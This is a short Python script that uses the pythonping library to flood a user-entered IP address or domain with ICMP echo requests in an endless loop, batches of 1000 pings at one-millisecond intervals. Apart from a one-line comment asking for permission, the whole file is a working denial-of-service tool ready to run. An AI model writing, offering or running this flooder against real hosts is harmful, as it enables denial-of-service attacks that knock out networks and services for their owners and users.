# This script is designed to flood a target IP address with ICMP echo requests (pings).
# Use responsibly and ensure you have permission to test the target
from pythonping import ping
import time

def main():
    address = input("Enter a single IP address or domain: ")
    if not address:
        print("No address or IP provided supplied. Exiting.")
        return

    try:
        print(f"Starting infinite flood to {address}.....\nPress Ctrl+C to stop.")

        while True:
            ping(
                address,
                size=100,
                count=1000,
                timeout=1,
                interval=0.001
            )
            print(f"Ping results for {address}:")

    except KeyboardInterrupt:
        print("\nPing operation interrupted by user.")

    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()
